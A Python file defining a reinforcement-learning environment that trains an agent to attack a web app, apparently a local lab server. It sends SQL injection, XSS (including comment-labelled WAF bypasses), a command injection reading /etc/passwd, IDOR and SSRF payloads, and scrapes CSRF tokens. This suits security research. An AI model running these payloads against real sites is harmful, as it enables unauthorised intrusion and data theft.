import gymnasium as gym
from gymnasium import spaces
import numpy as np
import requests
import time
import re

class WebSecEnv(gym.Env):
    def __init__(self, target_url="http://localhost:5000"):
        super(WebSecEnv, self).__init__()
        self.target_url = target_url
        
        # Actions:
        # 0-2: Navigation (Home, Login, Search)
        # 3: SQLi (Basic) - Blocked by WAF
        # 4: XSS (Basic) - Blocked by WAF
        # 5-7: Navigation (Ping, Profile, Fetch)
        # 8: Cmd Inj (Basic) - Blocked by WAF
        # 9: IDOR (Basic)
        # 10: SSRF (Basic)
        # --- HARD MODE ACTIONS ---
        # 11: Wait (2s) - To bypass Rate Limit
        # 12: Extract CSRF Token - Required for Login
        # 13: SQLi (Obfuscated) - Bypasses WAF
        # 14: XSS (Obfuscated) - Bypasses WAF
        self.action_space = spaces.Discrete(15)
        
        # Observation: 
        # [page_id, status_code, vuln_detected, sensitive_data, waf_triggered, rate_limited, has_csrf]
        # Status: 0:OK, 1:Error, 2:Forbidden(403), 3:RateLimit(429)
        self.observation_space = spaces.Box(low=0, high=5, shape=(7,), dtype=np.float32)
        
        self.current_page = 0
        self.vuln_detected = 0
        self.sensitive_data_seen = 0
        self.waf_triggered = 0
        self.rate_limited = 0
        self.csrf_token = None
        
        self.max_steps = 30 # Increased for complex sequences
        self.current_step = 0

    def reset(self, seed=None, options=None):
        super().reset(seed=seed)
        self.current_page = 0
        self.vuln_detected = 0
        self.sensitive_data_seen = 0
        self.waf_triggered = 0
        self.rate_limited = 0
        self.csrf_token = None
        self.current_step = 0
        return self._get_obs(), {}

    def _get_obs(self, status_code=200):
        # Map status codes to simplified features
        if status_code == 200: s_val = 0
        elif status_code == 403: s_val = 2
        elif status_code == 429: s_val = 3
        else: s_val = 1
        
        has_csrf = 1 if self.csrf_token else 0
        
        return np.array([
            self.current_page, 
            s_val, 
            self.vuln_detected, 
            self.sensitive_data_seen,
            self.waf_triggered,
            self.rate_limited,
            has_csrf
        ], dtype=np.float32)

    def step(self, action):
        self.current_step += 1
        reward = -1  # Step penalty
        terminated = False
        truncated = False
        info = {}
        
        # Reset transient flags
        self.waf_triggered = 0
        self.rate_limited = 0
        
        try:
            # Navigation
            if action == 0: # Home
                r = requests.get(f"{self.target_url}/")
                self.current_page = 0
            elif action == 1: # Login
                r = requests.get(f"{self.target_url}/login")
                self.current_page = 1
            elif action == 2: # Search
                r = requests.get(f"{self.target_url}/search")
                self.current_page = 2
            elif action == 5: # Ping
                r = requests.get(f"{self.target_url}/ping")
                self.current_page = 3
            elif action == 6: # Profile
                r = requests.get(f"{self.target_url}/profile")
                self.current_page = 4
            elif action == 7: # Fetch
                r = requests.get(f"{self.target_url}/fetch")
                self.current_page = 5
            
            # Special Actions
            elif action == 11: # Wait
                time.sleep(2.5) # Wait > 2s window
                r = requests.get(f"{self.target_url}/") # Refresh
                reward = 0 # Neutral reward for waiting correctly
                
            elif action == 12: # Extract CSRF
                if self.current_page == 1: # Login page
                    r = requests.get(f"{self.target_url}/login")
                    # Simple regex extraction
                    match = re.search(r'name="csrf_token" value="(.+?)"', r.text)
                    if match:
                        self.csrf_token = match.group(1)
                        reward = 5 # Small reward for finding token
                    else:
                        reward = -2
                else:
                    reward = -5
                    r = requests.get(f"{self.target_url}/")

            # Payloads
            elif action == 3: # SQLi (Basic) - Should fail WAF
                if self.current_page == 1:
                    data = {"username": "' OR '1'='1", "password": "foo"}
                    if self.csrf_token: data['csrf_token'] = self.csrf_token
                    
                    r = requests.post(f"{self.target_url}/login", data=data)
                    if r.status_code == 403:
                        self.waf_triggered = 1
                        reward = -10
                    elif "SQLI_SUCCESS" in r.text:
                        reward = 100
                        self.vuln_detected = 1
                        terminated = True
                else:
                    reward = -5
                    r = requests.get(f"{self.target_url}/")
            
            elif action == 13: # SQLi (Obfuscated)
                if self.current_page == 1:
                    # Bypass: ' or '1'='1 (lowercase 'or' might pass if WAF checks OR)
                    data = {"username": "' or '1'='1", "password": "foo"} 
                    if self.csrf_token: data['csrf_token'] = self.csrf_token
                    
                    r = requests.post(f"{self.target_url}/login", data=data)
                    if "SQLI_SUCCESS" in r.text:
                        reward = 100
                        self.vuln_detected = 1
                        terminated = True
                    elif r.status_code == 400: # Missing CSRF
                        reward = -10
                    elif r.status_code == 403:
                        self.waf_triggered = 1
                        reward = -10
                else:
                    reward = -5
                    r = requests.get(f"{self.target_url}/")

            elif action == 4: # XSS (Basic) - Should fail WAF
                if self.current_page == 2:
                    payload = "<script>alert(1)</script>"
                    r = requests.get(f"{self.target_url}/search", params={"q": payload})
                    if r.status_code == 403:
                        self.waf_triggered = 1
                        reward = -10
                    elif payload in r.text:
                        reward = 100
                        self.vuln_detected = 1
                        terminated = True
                else:
                    reward = -5
                    r = requests.get(f"{self.target_url}/")

            elif action == 14: # XSS (Obfuscated)
                if self.current_page == 2:
                    # Bypass: <img src=x onerror=alert(1)> (no script tag)
                    payload = "<img src=x onerror=alert(1)>"
                    r = requests.get(f"{self.target_url}/search", params={"q": payload})
                    if payload in r.text:
                        reward = 100
                        self.vuln_detected = 1
                        terminated = True
                    elif r.status_code == 403:
                        self.waf_triggered = 1
                        reward = -10
                else:
                    reward = -5
                    r = requests.get(f"{self.target_url}/")
            
            # Other payloads (Ping, Profile, Fetch) - kept simple for now or can be hardened too
            elif action == 8: # Cmd Inj
                 if self.current_page == 3:
                    r = requests.get(f"{self.target_url}/ping", params={"ip": "127.0.0.1; cat /etc/passwd"})
                    if r.status_code == 403:
                        self.waf_triggered = 1
                        reward = -10
                    elif "root:x:0:0" in r.text:
                        reward = 100
                        self.vuln_detected = 1
                        terminated = True
                 else:
                    reward = -5
                    r = requests.get(f"{self.target_url}/")
            
            elif action == 9: # IDOR
                if self.current_page == 4:
                    r = requests.get(f"{self.target_url}/profile", params={"user_id": "2"})
                    if "Admin (ID: 2)" in r.text:
                        reward = 100
                        self.vuln_detected = 1
                        terminated = True
                else:
                    reward = -5
                    r = requests.get(f"{self.target_url}/")
            
            elif action == 10: # SSRF
                if self.current_page == 5:
                    r = requests.get(f"{self.target_url}/fetch", params={"url": "http://localhost:5000/admin/debug"})
                    if "SECRET_KEY" in r.text:
                        reward = 100
                        self.vuln_detected = 1
                        terminated = True
                else:
                    reward = -5
                    r = requests.get(f"{self.target_url}/")

        except requests.exceptions.ConnectionError:
            return self._get_obs(500), -10, True, False, {}
            
        # Check Rate Limit Status from Response
        if r.status_code == 429:
            self.rate_limited = 1
            reward = -20 # Heavy penalty for getting banned

        if self.current_step >= self.max_steps:
            truncated = True

        return self._get_obs(r.status_code), reward, terminated, truncated, info
